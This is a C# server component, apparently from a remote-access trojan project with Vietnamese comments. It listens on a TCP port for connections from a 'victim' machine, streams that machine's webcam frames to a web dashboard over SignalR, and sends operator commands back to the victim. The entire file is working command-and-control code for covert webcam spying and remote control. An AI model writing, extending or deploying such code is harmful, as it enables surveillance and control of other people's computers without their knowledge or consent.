using Microsoft.Extensions.Hosting;
using Microsoft.AspNetCore.SignalR;
using System.Net;
using System.Net.Sockets;
using System.Text;
using WebcamBackend.Hubs;

namespace WebcamBackend.Services
{

    public class TcpServerService: BackgroundService // lớp cha này dùng để auto chạy và auto tắt web và chạy vòng ưhile vô tận mà k làm treo web
    {
        // readonly là chỉ gán giá trị đúng 1 lần trong constructor 
        private readonly IHubContext<WebcamHub> _hubContext;
        private TcpListener _listener;
        private const int PORT = 5656; // Cổng (số hiệu là 5656) mở ra chờ kết nối

        //## THÊM BIẾN NÀY: Để lưu trữ đường ống đang kết nối
        private NetworkStream _activeStream;
        // 3. THÊM HÀM NÀY: Để gửi lệnh xuống máy nạn nhân
        private void SendToVictim(string cmd)
        {
            try
            {
                if (_activeStream != null && _activeStream.CanWrite)
                {
                    // Phải cộng thêm "\n" vì máy nạn nhân dùng ReadLine()
                    byte[] data = Encoding.UTF8.GetBytes(cmd + "\n");
                    _activeStream.Write(data, 0, data.Length);
                    Console.WriteLine($"[Server Sent] {cmd}");
                }
                else
                {
                    Console.WriteLine("[Server Error] Chua co may nan nhan ket noi!");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Send Error] {ex.Message}");
            }
        }




        public TcpServerService(IHubContext<WebcamHub> hubContext)
        {
            _hubContext = hubContext;
            // Khi Web gọi SendCommand -> Hub báo tin -> Hàm SendToVictim chạy
            WebcamHub.OnCommandReceived += SendToVictim;
        }

        // Hàm chạy khởi động 
        // dùng async Task để web có thể thực hiện nhiều việc cùng lúc
        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            try
            {
                _listener = new TcpListener(IPAddress.Any, PORT);
                _listener.Start();
                Console.WriteLine($"[TCP Server] Dang lang nghe tai Port {PORT}...");

                while (!stoppingToken.IsCancellationRequested)
                {
                    // Tạm dừng để chờ máy server kết nối vào
                    var client = await _listener.AcceptTcpClientAsync(stoppingToken);
                    Console.WriteLine($"[TCP Server] May server da ket noi: {client.Client.RemoteEndPoint}");

                    // Tự đẩy sang luồng riêng để xử lý, tiếp tục quay lại đón server mới
                    _ = HandleClientAsync(client, stoppingToken);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[TCP Error] {ex.Message}");
            }
            finally
            {
                _listener?.Stop();
            }
        }
        private async Task HandleClientAsync(TcpClient client, CancellationToken token)
        {
            using (client)
            using (var stream = client.GetStream())
            {
                // ### Lưu stream lại để lát nữa dùng gửi lệnh
                _activeStream = stream;

                byte[] oneByte = new byte[1];
                try
                {
                    while (client.Connected && !token.IsCancellationRequested)
                    {
                        // 1. Đọc kích thước ảnh 
                        string sizeLine = "";
                        while (true)
                        {
                            int r = await stream.ReadAsync(oneByte, 0, 1, token);
                            if (r == 0) return;
                            char c = (char)oneByte[0];
                            if (c == '\n') break;
                            if (c != '\r') sizeLine += c;
                        }

                        if (!int.TryParse(sizeLine, out int size)) continue;
                        
                        // 2. Đọc dữ liệu ảnh
                        byte[] buffer = new byte[size];
                        int total = 0;
                        while (total < size)
                        {
                            int r = await stream.ReadAsync(buffer, total, size - total, token);
                            if (r == 0) return;
                            total += r;
                        }

                        // 3. Gửi lên Web (SignalR)
                        // Dùng base64 là vì chỉ có 2 cách để nhúng trực tiếp vào <img> là URL hoặc URI - base64
                        // Ngoài ra, đỡ phức tạp + file json (bit) k xử lý kĩ có thể bị lỗi mã hóa nếu k xưr lý kĩ --> base64 (string) ổn hơn
                        // Nhưng nặng hơn 1 xí so với file gốc 
                        string base64 = Convert.ToBase64String(buffer);
                        await _hubContext.Clients.All.SendAsync("ReceiveImage", base64, cancellationToken: token);
                    }
                }
                catch { }

                //########## 
                finally
                {
                    // 5. Dọn dẹp khi ngắt kết nối
                    _activeStream = null;
                    Console.WriteLine("[TCP Server] May nan nhan da ngat ket noi.");
                }
            }
        }
    }
}
